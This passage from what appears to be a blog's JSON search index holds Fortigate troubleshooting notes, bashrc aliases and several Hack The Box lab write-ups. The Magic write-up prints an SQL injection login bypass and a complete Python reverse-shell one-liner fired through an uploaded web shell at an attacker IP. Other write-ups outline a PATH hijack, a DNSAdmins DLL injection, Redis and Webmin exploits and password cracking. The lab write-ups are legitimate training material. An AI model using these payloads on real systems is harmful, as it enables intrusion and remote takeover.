been having an issue with setting up an IPSEC tunnel between a client and me.Setting it up as per the spec and it was not connecting. It was hard to diagnose from the frontend as the frontend logs are pretty much useless for troubleshooting.So we have to do this via the CLI (command line interface). To achieve this just run the following commands.To get the tunnel name:firewall-01 # get vpn ipsec tunnel summary&#39;IPSEC_TUN_01&#39; 10.0.0.1:0 selectors(total,up): 1/0 rx(pkt,err): 0/0 tx(pkt,err): 0/0Setup the log to filter only the selected tunnelfirewall-01 # diagnose vpn ike log-filter name &quot;IPSEC_TUN_01&quot;Setup to debugfirewall-01 # diagnose debug application ike -1firewall-01 # diagnose debug enableOnce that is done, your terminal will be outputting the IPSEC log which you can look at to diagnose for more troubleshooting." }, { "title": "Aliases With bashrc", "url": "/bashrc-Shortcuts/", "categories": "blog", "tags": "bash, linux, alias", "date": "2020-10-28 11:30:00 +0700", "snippet": "bashrc is a shell script that executes whenever a user logs in via bash terminal. This script can contain configuration settings such as coloring, command aliases, environment variables, etc.One thing I have started doing is using it to create aliases for commands, so instead of typing out a long command I now just run a short command.Whenever you edit the bashrc file you would have to reload the file from command line or logout and login again to your bash shell. To circumvent this, one method would be to do the following:Add the following line to your bashrc:alias bashrc=&#39;vi ~/.bashrc ; source ~/.bashrc&#39;So now whenever you run bashrc, edit the file, exit and wala!Some useful commands I have added:#Mini Python Webserveralias ws=&#39;sudo python3 -m http.server 80&#39;#Speedtestalias speed=&#39;speedtest-cli&#39;#Historyalias h=&#39;history|grep&#39;#connect to vpnsalias vpnh=&#39;sudo openvpn ~/VPN/HTB/hackthebox.ovpn&#39;alias vpnt=&#39;sudo openvpn ~/VPN/THM/tryhackme.ovpn&#39;#Update systemif [ $UID -ne 0 ]; then alias aptu=&#39;sudo apt update ; sudo apt upgrade&#39; alias apti=&#39;sudo apt install&#39; alias apts=&#39;sudo apt search&#39;fi#get my internet ipalias myip=&#39;curl https://ifconfig.io/&#39;#Searchalias search=&#39;sudo updatedb ; locate&#39;" }, { "title": "Fortigate BGP Route Is Not Advertising", "url": "/Fortigate-BGP-Route-Not-Advertising/", "categories": "blog, fortigate", "tags": "fortigate, fortinet, firewall", "date": "2020-09-10 16:00:00 +0700", "snippet": "I configured a new subnet, 10.0.4.0/24, for BGP in the prefix-list but it did not show up in the advertised routes.To find the name of your prefix-list run the command show router prefix-list. in the below example, it is called “NAME-OUT”firewall-01 # show router prefix-listconfig router prefix-list edit &quot;NAME-OUT&quot; config rule edit 1 set prefix 10.0.2.0 255.255.255.0 unset ge unset le next edit 2 set prefix 10.0.3.0 255.255.255.0 unset ge unset le next edit 2 set prefix 10.0.4.0 255.255.255.0 unset ge unset le next end nextend It showed up in the prefix-listfirewall-01 # get router info bgp prefix-list NAME-OUTBGP table version is 2, local is 10.10.10.1Status codes:s suppressed, d damped, h history, *valid &amp;gt; best, -i internal, S StaleOrigin codes:i - IGP, e - EGP, ? - incompleteNetwork Next Hop Metric LocPrf Weight Path*&amp;gt; 10.0.2.0/24 10.0.0.1 33456 ?*&amp;gt; 10.0.3.0/24 10.0.0.1 33456 ?*&amp;gt; 10.0.4.0/24 10.0.0.1 33456 ?But not in the advertised routesfirewall-01 # get router info bgp neighbors 10.10.10.1 advertised-routeBGP table version is 2, local is 10.10.10.1Status codes:s suppressed, d damped, h history, *valid &amp;gt; best, -i internal, S StaleOrigin codes:i - IGP, e - EGP, ? - incompleteNetwork Next Hop Metric LocPrf Weight Path*&amp;gt; 10.0.2.0/24 10.0.0.1 33456 ?*&amp;gt; 10.0.3.0/24 10.0.0.1 33456 ?To resolve this I needed to do a BGP soft resetexec router clear bgp all softOnce that was done, the new subnet showed up in the advertised routesfirewall-01 # get router info bgp prefix-list NAME-OUTBGP table version is 2, local is 10.10.10.1Status codes:s suppressed, d damped, h history, *valid &amp;gt; best, -i internal, S StaleOrigin codes:i - IGP, e - EGP, ? - incompleteNetwork Next Hop Metric LocPrf Weight Path*&amp;gt; 10.0.2.0/24 10.0.0.1 33456 ?*&amp;gt; 10.0.3.0/24 10.0.0.1 33456 ?*&amp;gt; 10.0.4.0/24 10.0.0.1 33456 ?If it doesn’t show up, make sure you have a static route for the subnet.firewall-01 # get router info routing-table staticS 10.0.2.0/24 [10/0] via 10.10.1.1, port1S 10.0.3.0/24 [10/0] via 10.10.1.1, port1S 10.0.4.0/24 [10/0] via 10.10.1.1, port1" }, { "title": "Fortigate SNMPD Process Crashing", "url": "/Fortigate-SNMPD-Crashing/", "categories": "blog, fortigate", "tags": "fortigate, fortinet, firewall", "date": "2020-09-09 13:00:00 +0700", "snippet": "A fortigate I manage starting giving issues where the SNMPD process would crash with a signal 6 and restart itself on a regular basis.After some troubleshooting it seems that it may be caused by duplicate snmp-index on multiple intefaces.config system interface edit &quot;mgmt&quot; set vdom &quot;root&quot; set ip 172.16.1.1 255.255.255.0 set allowaccess ping https ssh snmp http fgfm set type physical set dedicated-to management set role lan set snmp-index 1 next edit &quot;ha&quot; set vdom &quot;root&quot; set type physical set snmp-index 2 next edit &quot;port1&quot; set ip 10.10.10.1 255.255.255.0 set vdom &quot;root&quot; set allowaccess ping set type physical set role lan set snmp-index 2 nextTo resolve this issue change the snmp-index:config system interfaceedit port1set snmp-index 3nextend" }, { "title": "Magic Writeup", "url": "/Magic-Writeup/", "categories": "hackthebox", "tags": "hackthebox, writeup, magic", "date": "2020-04-20 11:30:00 +0700", "snippet": "Let’s do a NMAP scanBrowsing to http://10.10.10.185 we get a page with images and on the bottom left a login to upload images.Let’s click on the login link.I tried default top 10 usernames and passwords combos but nothing.Since we have no credentials, we can try SQL injectionusername: &#39;or &#39;1&#39;=&#39;1password: &#39;or &#39;1&#39;=&#39;1We get prompted with an upload page for images.Let’s see what can be uploaded. Let’s just click upload.Only JPG, JPEG and PNG files are allowed. We need to bypass the filter.Let’s first upload a JPEG file and see where it saves it to.When we upload a picture it adds it to the front page on the slider and so we can right click to view image and we can see it saves it under http://10.10.10.185/images/uploads/Now let’s do some magicTake any JPG,JPEG or PNG inject it with some code and then rename the file.Upload this file via the upload pageIn another terminal run nc -lvnp 9991The only payload I found to work was the python methodNow point your browser or use curl to the following URLhttp://10.10.10.185/images/uploads/lordcommander.php.jpeg?cmd=python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.14.31”,9991));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);We have a shell!Let’s get an interactive shellpython -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;ctrl + z (put&#39;s the nc into the background)echo $TERM (this gets what your term is set as)stty -a (this gets your windows size)stty raw -echo (NOTE: you will not see any output after this)fg (go back to the nc)reset (this resets the terminal settings on the remote machineIn the Terminal type, type in the $TERM output you got, in my case it was xterm-256color. NOTE: as of recent, this method I found has not been working as intended and sometimes hands the termminal.After enumerating a bit we get the following.I tried to use the password to login via ssh and su but both failed.This is not the password for the user.Let’s enumerate the database. There is no mysql client installed so the only way now is to do a mysqldump.We then find this in the dump.We have some creds. Password reuse?Let us just su to the user with the password.user flag achieved!Now for root.We first have to upload some enumerating scripts.I uploaded both LinEnum and LinPEAS and found this pretty interesting:/bin/sysinfo is executable and the user group has permissions to run it.There is another tool called pspy64 which monitors linux processes and we can use this to see what sysinfo does in the background. So we run /bin/sysinfo and monitor pspy64 and see the following.sysinfo calls a few files and seems like we can inject our own path to point to a custom created fdisk file to maybe create a reverse shell?First in another terminal run our nc -lvnp 9994Back to the magic terminal and let us add /tmp into the system PATHexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin:/usr/games:/usr/local/games:/snap/bin:/tmpWe then create a file in /tmp with the following.Make it executable and then run /bin/sysinfo again and we watch pspy64.You can see it has now executed our code from the fdisk file we created in the /tmp directory instead of the actual operating system’s fdisk!Let us pop to the terminal where we can our nc.WE HAVE ROOT!" }, { "title": "Resolute Writeup", "url": "/Resolute-Writeup/", "categories": "hackthebox", "tags": "hackthebox, writeup, resolute", "date": "2019-12-24 11:30:00 +0700", "snippet": "let’s start with a nmapNo port 80 or 443. This is going to be interesting. It looks like it has samba and LDAP running.Let us run a tool called enum4linux and see if we can get any information out.We get the domain and also a bunch of domain usersWhat do we have here?Looks like a username and password.Let’s use a tool called “evil-winrm” to loginNo luck. What if the administrator used that password to create the rest of the users and we have a user who has not changed their password?After going through all the users we actually found one! Naughty Melanie.After I log in to a user my first instinct, on a windows machine, is to check the user’s desktop directory first to see if there is any flag or note. This time it seems like this user was the intended user!User flag done!Now to get root flag.Usually one also looks at what other users are on the box so you can get an idea of if you can get a privilege escalation out of them.We find another user called ryan but we don’t have a password or access to that user’s home directory.Let’s enumerate some more.After enumerating quite a bit I finally found the following. To look for hidden directories on windows, you simpy just use dir -force.I am not gonna post the whole file here because it’s a bit big but I will show you the juicy info.Could this be ryan’s password? Let’s see. I use Evil-WinRM once again.Success! But it’s not the Administrator. Let’s browse around his user space and see what we can find.A note. Drats. This could prove to be interesting as any changes we make to the system will be reverted in a minute.Let’s see what groups ryan is in. Maybe we can leverage off a group?Seems like ryan is part of the DNSAdmin group. The DNSAdmin is a full privileged administrator of a server. Let’s try exploit this!I got a bit of a nudge and stumbled across the following article:https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromiseWe need to create a reverse shell payload. I tried to create many payloads but the Anti Virus or Windows Defender kept on destroying my payload. Especially .exe files would be thrown off a cliff. I also tried with .DLL files but also to no avail. It was frustrating me.Eventually someone showed me the one from Mimikatz which was altered a bit and eventually used that one.Now we need to create a Samba share to be able to get the reverse shell and it seems that anything we copy to the server would just get blocked from running locally.First let’s start a nc listenerOnce that is started we can go to the server and run the followingThis injects the .dll into the regkey. We now have to stop and start the DNS Service to activate it.To check to see if it was inserted into the keyIf this was successful, the following should happen on your nc listener window. I did have some issues doing this multiple of times as I was doing this in the free tier I was fighting with people injecting their payloads. Just keep trying.Connected!Root flag achieved!" }, { "title": "Traverxec Writeup", "url": "/Traverxec-Writeup/", "categories": "hackthebox", "tags": "hackthebox, writeup, traverxec", "date": "2019-12-24 06:30:00 +0700", "snippet": "Let&#39;s do the nmap scanPorts 22 and 80 are open.Browsing to the webpage I found nothing of interest and running GoBuster brought back no results.Noticing the webserver that is running Nostromo I checked for any exploits.Found one, let&#39;s see what happens!Reverse shell given!First thing to do is find the webserver config and see what we can get.Browsing htdocs brought nothing useful. Now we check .htpasswd and see.Let&#39;s crack it!I used another box of mine that cracks passwords quicker and found the following.Let us try our luck with ssh login.Thought as much. In the Nostromo config we see that user home directories are setup.Drats.After trying and understanding what the homedir setting does, we managed to get into the user&#39;s public_www directory. Nice file permissions.Wait, what do we have here? He backed up his ssh keys where?Let&#39;s browse to the folder on the webpage.Use the credentials from above for david.Download the file and untar it.Now we need to convert the private key to push it through John to crack the password.Password cracked and now we have the user flag!&amp;gt;There is a file in the bin directory which we need to have a look at.Running this script just outputs a couple of things and doesn&#39;t do anything special on output. I hit a bit of a wall at this stage and then I saw a clue when someone mentioned GTFOBins - https://gtfobins.github.io/ This is where things get weird. Bare with me.If your terminal is full screen and you run the command then the following happens.But now if you make your terminal smaller and run the command again, then the following happensWhen the above screen shows, enter !/bin/bash and you will be given a root prompt, wtf?&amp;gt;root flag :)" }, { "title": "Postman Writeup", "url": "/Postman-Writeup/", "categories": "hackthebox", "tags": "hackthebox, writeup, postman", "date": "2019-12-22 20:00:00 +0700", "snippet": "Let’s do the normal nmap scanWe have found the following:SSH (port 22)HTTP (port 80)Redis (port 6379)Webmin (10000)Exploring the website on port 80, I found nothing of interest.Let’s run gobuster against port 80Browsing to those directories didn’t find anything.Webmin (port 10000) needs a username and password and the exploits that are available needs a username and password so for now we will not touch Webmin just yet. So we will focus on Redis (port 6379)There is an exploit that we can use and we can download the following to exploit Redishttps://github.com/Avinash-acid/Redis-Server-ExploitLooking at the code we need to change the following in the script as the default installation of Redis is in /var/lib/redis and the script points to /home/username/Now we can run the scriptNow we have a reverse shell on the system to the redis user. We still need to esculate to the user on the system.After browsing around for a while, I noticed the followingWe have a file called id_rsa.bak which is a private ssh key, It seems to be owned by a user called Matt! When I tried to use it to log into ssh with it, it was asking for a password and we do not have the password. John password cracker is able to crack ssh keys when you throw dictionaries at it. First we need to convert it into a format that John knows about. There is a tool called ssh2john. Just a note, you need the jumbo version of John for this.Now that we have it in the correct format, we can now try bruteforce the key with John.Low and behold, we have Matt’s private ssh key password?Now we can use the original file to login to ssh with.Wait what?? Let’s see what happens when we just so a su - Matt when we are logged in with the Redis user.&amp;gt;user flag achieved!Remember how I said earlier that we needed a username and password to use a certain exploit for Webmin? Well, here goes nothing.then we just run exploit&amp;gt;Well hello there root flag!" }, { "title": "Bitlab Writeup", "url": "/Bitlab-Writeup/", "categories": "hackthebox", "tags": "hackthebox, writeup, bitlab", "date": "2019-12-22 11:30:00 +0700", "snippet": "first we do the usual nmap scanWe find that ports 22 and 80 are open. Let’s browse to port 80 and see what we find.A GitLab installation! We need a username and password to login though but we don’t have one!After some browsing through the site we see that we can click on help at the bottom of the page which takes us toand then when clicking on bookmarks.html to thisWhen we hover the mouse on “Gitlab Login” you can notice this piece of code at the bottom of the browserWe need the bits between the [ and ]. It looks a lot like hex but we first need to strip away the \\x and now we can put that into a hexdecoder and then we are left with the following.You will notice a username and password. clave:d11des0081xWe can now use this to login to GitLab.After browsing around for a while I found the following under the snippets tab on top.Connect details to the Postgres database. We cannot access it directly and only within the machine. We need to try find a way into the machine with a shell.Being able to upload files to the repository we can try upload a reverse shell with PHP. I created a PHP file with the following code.Just remember to use your IP otherwise you will not get a reverse shell back to your machine as I have done on a couple of occasions.In the profile repository, click on the + icon and select upload file and upload your file, in my case it was cake.php.Then click Submit merge request and then Merge on the next screens.Once that is done, we now have to listen for connections coming into our box with the nc command.We can now browse to our reverse shell PHP file to initiate the reverse connection by browsing to http://10.10.10.114/profile/cake.phpYou should now see a reverse shell on your nc windowWe are connected BUT we kinda have a useless terminal which is not interactive meaning you cannot create or edit files easily. We can fix this though with the following steps:python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;ctrl + z (put&#39;s the nc into the background)echo $TERM (this gets what your term is set as)stty -a (this gets your windows size)stty raw -echo (NOTE: you will not see any output after this)fg (go back to the nc)reset (this resets the terminal settings on the remote machineIn the Terminal type, type in the $TERM output you got, in my case it was xterm-256color. then enter the following:export SHELL=bashstty rows 29 columns 147 (this matches what yours is upbove)I then created a new file under /tmp/cakeand then ran itOh look, could that be clave’s SSH details?yes it was!Now for root.Copy RemoteConnection.exe to your machine. I just scp’d it to my machine.We now have to reverse engineer (debug more like it). I use a tool called OllyDBG.Once opened we can try run the program but we get a “Access Denied !!”We have to debug it and see how we can bypass that. Right click on the left and search for all text strings.We actually see the “Access Denied !!” part.Double click it and you will be take to the portion of the program where it executes. Right click and then select fill with NOPs. This will cause the program to bypass that function.Now run the program again.Focus on the bottom right window.Scroll down and you will see the followingCould that be???Indeed!" } ]
